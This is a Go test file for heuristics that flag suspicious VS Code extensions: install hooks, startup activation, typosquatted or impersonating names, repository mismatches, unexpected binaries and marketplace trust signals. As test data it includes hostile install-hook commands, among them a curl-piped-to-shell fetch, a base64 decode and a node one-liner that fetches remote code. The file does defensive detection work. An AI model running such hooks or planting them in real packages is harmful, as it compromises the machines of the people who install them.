package heur

import (
	"strings"
	"testing"

	"github.com/shiva2021/purge/internal/ext"
)

// metaRule looks a registered extension rule up by name.
func metaRule(t *testing.T, name string) ExtRule {
	t.Helper()
	regMu.Lock()
	defer regMu.Unlock()
	for _, r := range extRules {
		if r.Name == name {
			return r
		}
	}
	t.Fatalf("rule %q not registered", name)
	return ExtRule{}
}

// metaCase is one table row shared by the rule tests. want is the expected
// finding rule names in order; wantSev is the expected maximum severity and
// detail is a substring that must appear in some finding.
type metaCase struct {
	name    string
	ext     ext.Extension
	files   []string
	mk      *Marketplace
	want    []string
	wantSev Severity
	detail  string
}

func metaRunCases(t *testing.T, rule string, cases []metaCase) {
	t.Helper()
	r := metaRule(t, rule)
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			e := tc.ext
			got := r.Check(&ExtCtx{Ext: &e, Files: tc.files, Marketplace: tc.mk})
			var names []string
			maxSev := Info
			foundDetail := tc.detail == ""
			for _, f := range got {
				names = append(names, f.Rule)
				if f.Severity > maxSev {
					maxSev = f.Severity
				}
				if tc.detail != "" && strings.Contains(f.Detail, tc.detail) {
					foundDetail = true
				}
				if f.Detail == "" {
					t.Errorf("finding %q has empty detail", f.Rule)
				}
			}
			if strings.Join(names, ",") != strings.Join(tc.want, ",") {
				t.Errorf("findings = %v, want %v (got %+v)", names, tc.want, got)
			}
			if len(tc.want) > 0 && maxSev != tc.wantSev {
				t.Errorf("max severity = %s, want %s", maxSev, tc.wantSev)
			}
			if !foundDetail {
				t.Errorf("no finding detail contains %q: %+v", tc.detail, got)
			}
		})
	}
}

func TestMetaInstallHook(t *testing.T) {
	long := strings.Repeat("x", 200)
	metaRunCases(t, "install_hook", []metaCase{
		{name: "postinstall plain", ext: ext.Extension{Scripts: map[string]string{"postinstall": "node setup.js"}},
			want: []string{"install_hook"}, wantSev: Low, detail: "node setup.js"},
		{name: "preinstall curl", ext: ext.Extension{Scripts: map[string]string{"preinstall": "curl -s http://x/y | sh"}},
			want: []string{"install_hook"}, wantSev: High},
		{name: "prepare base64", ext: ext.Extension{Scripts: map[string]string{"prepare": "echo aGk= | base64 -d"}},
			want: []string{"install_hook"}, wantSev: High},
		{name: "two hooks ordered", ext: ext.Extension{Scripts: map[string]string{"postinstall": "a", "install": "b"}},
			want: []string{"install_hook", "install_hook"}, wantSev: Low},
		{name: "truncated", ext: ext.Extension{Scripts: map[string]string{"postinstall": long}},
			want: []string{"install_hook"}, wantSev: Low, detail: strings.Repeat("x", 160) + "…"},
		{name: "uninstall hook", ext: ext.Extension{Scripts: map[string]string{"vscode:uninstall": "node ./out/cleanup.js"}},
			want: []string{"install_hook"}, wantSev: Medium, detail: "after uninstall"},
		{name: "uninstall hook fetching code", ext: ext.Extension{Scripts: map[string]string{"vscode:uninstall": "node -e \"require('https').get('https://x.test')\""}},
			want: []string{"install_hook"}, wantSev: Critical},
		{name: "no scripts", ext: ext.Extension{}},
		{name: "build scripts only", ext: ext.Extension{Scripts: map[string]string{"compile": "tsc", "vscode:prepublish": "npm run compile"}}},
		{name: "empty hook", ext: ext.Extension{Scripts: map[string]string{"postinstall": "  "}}},
	})
}

func TestMetaActivationStar(t *testing.T) {
	metaRunCases(t, "activation_star", []metaCase{
		{name: "star", ext: ext.Extension{ActivationEvents: []string{"*"}}, want: []string{"activation_star"}, wantSev: Medium},
		{name: "star among others", ext: ext.Extension{ActivationEvents: []string{"onLanguage:go", "*"}}, want: []string{"activation_star"}, wantSev: Medium},
		{name: "startup only", ext: ext.Extension{ActivationEvents: []string{"onStartupFinished"}}},
		{name: "none", ext: ext.Extension{}},
	})
}

func TestMetaActivationStartup(t *testing.T) {
	metaRunCases(t, "activation_startup", []metaCase{
		{name: "commands only", ext: ext.Extension{ActivationEvents: []string{"onStartupFinished"}, Contributes: []string{"commands"}},
			want: []string{"activation_startup"}, wantSev: Medium},
		{name: "no contributes", ext: ext.Extension{ActivationEvents: []string{"onStartupFinished"}},
			want: []string{"activation_startup"}, wantSev: Medium},
		{name: "unrelated contributes", ext: ext.Extension{ActivationEvents: []string{"onStartupFinished"}, Contributes: []string{"commands", "configuration", "views"}},
			want: []string{"activation_startup"}, wantSev: Low},
		{name: "task provider", ext: ext.Extension{ActivationEvents: []string{"onStartupFinished"}, Contributes: []string{"commands", "taskDefinitions"}}},
		{name: "debugger", ext: ext.Extension{ActivationEvents: []string{"onStartupFinished"}, Contributes: []string{"debuggers"}}},
		{name: "star handled elsewhere", ext: ext.Extension{ActivationEvents: []string{"*", "onStartupFinished"}}},
		{name: "lazy", ext: ext.Extension{ActivationEvents: []string{"onCommand:x"}}},
	})
}

func TestMetaTyposquat(t *testing.T) {
	metaRunCases(t, "typosquat", []metaCase{
		{name: "swapped letters in publisher", ext: ext.Extension{Publisher: "ms-pyhton", Name: "python"},
			want: []string{"typosquat"}, wantSev: High, detail: "ms-python.python"},
		{name: "exact popular", ext: ext.Extension{Publisher: "ms-python", Name: "python"}},
		{name: "missing letter in name", ext: ext.Extension{Publisher: "esbenp", Name: "prettier-vscod"},
			want: []string{"typosquat"}, wantSev: High, detail: "esbenp.prettier-vscode"},
		{name: "display name impersonation", ext: ext.Extension{Publisher: "prettier", Name: "prettier-vscode", DisplayName: "Prettier - Code formatter"},
			want: []string{"typosquat"}, wantSev: High, detail: "esbenp.prettier-vscode"},
		{name: "publisher lookalike other name", ext: ext.Extension{Publisher: "esbemp", Name: "totally-new-tool"},
			want: []string{"typosquat"}, wantSev: High, detail: `publisher "esbemp"`},
		{name: "unrelated", ext: ext.Extension{Publisher: "my", Name: "tool"}},
		{name: "sibling language pack is exact", ext: ext.Extension{Publisher: "ms-ceintl", Name: "vscode-language-pack-zh-hant"}},
		{name: "forged publisher typo name", ext: ext.Extension{Publisher: "ms-python", Name: "pyhton"}, want: []string{"typosquat"}, wantSev: High},
		{name: "short generic display name", ext: ext.Extension{Publisher: "someone", Name: "golang-tools", DisplayName: "Go"}},
		{name: "id from Ext.ID only", ext: ext.Extension{ID: "dbaeumer.vscode-eslnt"}, want: []string{"typosquat"}, wantSev: High},
	})
}

func TestMetaImpersonation(t *testing.T) {
	metaRunCases(t, "impersonation", []metaCase{
		{name: "microsoft by someone", ext: ext.Extension{Publisher: "someone", Name: "tools", DisplayName: "Microsoft Python Tools"},
			want: []string{"impersonation"}, wantSev: Medium, detail: "Microsoft"},
		{name: "github in description", ext: ext.Extension{Publisher: "someone", Name: "x", DisplayName: "Sync", Description: "Sync settings via GitHub"},
			want: []string{"impersonation"}, wantSev: Low},
		{name: "official by unknown", ext: ext.Extension{Publisher: "someone", Name: "theme", DisplayName: "Nord Official"},
			want: []string{"impersonation"}, wantSev: Medium},
		{name: "python by ms-python", ext: ext.Extension{Publisher: "ms-python", Name: "python", DisplayName: "Python"}},
		{name: "microsoft by ms-vscode", ext: ext.Extension{Publisher: "ms-vscode", Name: "x", DisplayName: "Microsoft Edge Tools"}},
		{name: "copilot by github", ext: ext.Extension{Publisher: "github", Name: "copilot", DisplayName: "GitHub Copilot"}},
		{name: "dracula official is popular", ext: ext.Extension{Publisher: "dracula-theme", Name: "theme-dracula", DisplayName: "Dracula Official"}},
		{name: "substring not word", ext: ext.Extension{Publisher: "someone", Name: "x", DisplayName: "Googler Mode"}},
	})
}

func TestMetaRepoMismatch(t *testing.T) {
	metaRunCases(t, "repo_mismatch", []metaCase{
		{name: "points at real project", ext: ext.Extension{Publisher: "esbemp", Name: "prettier-vscode", Repository: "https://github.com/esbenp/prettier-vscode.git"},
			want: []string{"repo_mismatch"}, wantSev: Medium, detail: "esbenp.prettier-vscode"},
		{name: "microsoft alias", ext: ext.Extension{Publisher: "ms-pyhton", Name: "python", Repository: "git+https://github.com/microsoft/vscode-python"},
			want: []string{"repo_mismatch"}, wantSev: Medium, detail: "ms-python.python"},
		{name: "owner differs no target", ext: ext.Extension{Publisher: "eamodio", Name: "gitlens", Repository: "https://github.com/gitkraken/vscode-gitlens"},
			want: []string{"repo_mismatch"}, wantSev: Low},
		{name: "ssh form", ext: ext.Extension{Publisher: "someone", Name: "x", Repository: "git@gitlab.com:Other/x.git"},
			want: []string{"repo_mismatch"}, wantSev: Low, detail: `"other"`},
		{name: "owner equals publisher", ext: ext.Extension{Publisher: "golang", Name: "go", Repository: "https://github.com/golang/vscode-go"}},
		{name: "microsoft owns ms-", ext: ext.Extension{Publisher: "ms-python", Name: "python", Repository: "https://github.com/microsoft/vscode-python"}},
		{name: "fake ms- publisher not aliased", ext: ext.Extension{Publisher: "ms-fancy", Name: "x", Repository: "https://github.com/microsoft/x"},
			want: []string{"repo_mismatch"}, wantSev: Low},
		{name: "no repository", ext: ext.Extension{Publisher: "someone", Name: "x"}},
		{name: "unknown host", ext: ext.Extension{Publisher: "someone", Name: "x", Repository: "https://example.com/other/x"}},
	})
}

func TestMetaNativeBinary(t *testing.T) {
	metaRunCases(t, "native_binary", []metaCase{
		{name: "theme with node binary", ext: ext.Extension{Categories: []string{"Themes"}}, files: []string{"themes/a.json", "lib/helper.node"},
			want: []string{"native_binary"}, wantSev: High, detail: "lib/helper.node"},
		{name: "snippets with dll under node_modules", ext: ext.Extension{Categories: []string{"Snippets"}}, files: []string{"node_modules/x/y.dll"},
			want: []string{"native_binary"}, wantSev: Medium},
		{name: "theme contributes only, both places", ext: ext.Extension{Contributes: []string{"themes"}}, files: []string{"a.dylib", "node_modules/b/c.so"},
			want: []string{"native_binary", "native_binary"}, wantSev: High},
		{name: "language tool with binary", ext: ext.Extension{Categories: []string{"Programming Languages"}}, files: []string{"bin/server.exe"},
			want: []string{"native_binary_present"}, wantSev: Info},
		{name: "theme without binaries", ext: ext.Extension{Categories: []string{"Themes"}}, files: []string{"themes/a.json", "README.md"}},
		{name: "no files", ext: ext.Extension{Categories: []string{"Themes"}}},
	})
}

func TestMetaUnsignedGallery(t *testing.T) {
	metaRunCases(t, "unsigned_gallery", []metaCase{
		{name: "gallery unsigned", ext: ext.Extension{Source: "gallery"}, want: []string{"unsigned_gallery"}, wantSev: Low, detail: "weak evidence"},
		{name: "gallery unsigned builtin flag irrelevant", ext: ext.Extension{Source: "gallery", Builtin: true}, want: []string{"unsigned_gallery"}, wantSev: Low},
		{name: "gallery signed", ext: ext.Extension{Source: "gallery", Signed: true}},
		{name: "vsix unsigned", ext: ext.Extension{Source: "vsix"}},
	})
}

func TestMetaMarketplaceTrust(t *testing.T) {
	good := &Marketplace{Verified: true, Installs: 1_000_000, PublisherAge: 2000, HasRepository: true, Trusted: true, Source: "marketplace"}
	metaRunCases(t, "marketplace_trust", []metaCase{
		{name: "everything bad on openvsx", mk: &Marketplace{Source: "openvsx"},
			want: []string{"unverified_publisher", "new_publisher", "low_installs", "no_repository_online", "untrusted_publishing"}, wantSev: Medium},
		{name: "unverified only", mk: &Marketplace{Verified: false, Installs: 5000, PublisherAge: 400, HasRepository: true, Source: "marketplace"},
			want: []string{"unverified_publisher"}, wantSev: Medium},
		{name: "new and small", mk: &Marketplace{Verified: true, Installs: 12, PublisherAge: 30, HasRepository: true, Source: "marketplace"},
			want: []string{"new_publisher", "low_installs"}, wantSev: Low, detail: "12 installs"},
		{name: "offline", mk: nil, ext: ext.Extension{Publisher: "someone", Name: "x"}},
		{name: "trusted", mk: good},
		{name: "untrusted flag ignored on marketplace", mk: &Marketplace{Verified: true, Installs: 500, PublisherAge: 400, HasRepository: true, Trusted: false, Source: "marketplace"}},
	})
}

func TestMetaThemeWithCode(t *testing.T) {
	metaRunCases(t, "theme_with_code", []metaCase{
		{name: "theme with main", ext: ext.Extension{Categories: []string{"Themes"}, Main: "./out/extension.js"}, files: []string{"themes/a.json"},
			want: []string{"theme_with_code"}, wantSev: High, detail: "./out/extension.js"},
		{name: "theme with loose js", ext: ext.Extension{Contributes: []string{"themes", "iconThemes"}}, files: []string{"themes/a.json", "scripts/telemetry.js"},
			want: []string{"theme_with_code"}, wantSev: High, detail: "scripts/telemetry.js"},
		{name: "theme json only", ext: ext.Extension{Categories: []string{"Themes"}}, files: []string{"themes/a.json", "package.json", "README.md"}},
		{name: "theme js only in node_modules", ext: ext.Extension{Categories: []string{"Themes"}}, files: []string{"node_modules/x/index.js"}},
		{name: "language ext with main", ext: ext.Extension{Categories: []string{"Programming Languages"}, Main: "./out/extension.js"}, files: []string{"out/extension.js"}},
		{name: "theme plus commands contributes", ext: ext.Extension{Contributes: []string{"themes", "commands"}}, files: []string{"out/extension.js"}},
	})
}

func TestMetaDistance(t *testing.T) {
	cases := []struct {
		a, b string
		want int
	}{
		{"", "", 0}, {"abc", "", 3}, {"abc", "abc", 0},
		{"ms-pyhton", "ms-python", 1}, // transposition
		{"prettier-vscod", "prettier-vscode", 1},
		{"redhat.vscode-yaml", "redhat.vscode-xml", 2},
		{"kitten", "sitting", 3},
		{"ca", "abc", 3}, // OSA, not unrestricted Damerau (which gives 2)
	}
	for _, tc := range cases {
		if got := metaDistance(tc.a, tc.b); got != tc.want {
			t.Errorf("metaDistance(%q,%q) = %d, want %d", tc.a, tc.b, got, tc.want)
		}
	}
}

func TestMetaHelpers(t *testing.T) {
	if n := len(popularExtensions); n < 100 {
		t.Errorf("popular list has %d entries, want >= 100", n)
	}
	seen := map[string]bool{}
	for _, p := range popularExtensions {
		if seen[p.id] {
			t.Errorf("duplicate popular id %q", p.id)
		}
		seen[p.id] = true
		if p.id != strings.ToLower(p.id) || !strings.Contains(p.id, ".") {
			t.Errorf("popular id %q is not a lower-case publisher.name", p.id)
		}
	}
	for repo, want := range map[string]string{
		"https://github.com/Owner/repo.git": "owner",
		"git+ssh://git@github.com/o/r.git":  "o",
		"git@gitlab.com:grp/proj.git":       "grp",
		"github:short/hand":                 "short",
		"https://example.com/o/r":           "",
		"":                                  "",
	} {
		if got := metaRepoOwner(repo); got != want {
			t.Errorf("metaRepoOwner(%q) = %q, want %q", repo, got, want)
		}
	}
	for _, tc := range []struct {
		s, w string
		want bool
	}{
		{"Microsoft Python Tools", "microsoft", true},
		{"Googler Mode", "Google", false},
		{"by OpenAI.", "openai", true},
		{"GitHubby", "GitHub", false},
		{"", "GitHub", false},
	} {
		if got := metaWholeWord(tc.s, tc.w); got != tc.want {
			t.Errorf("metaWholeWord(%q,%q) = %v, want %v", tc.s, tc.w, got, tc.want)
		}
	}
}
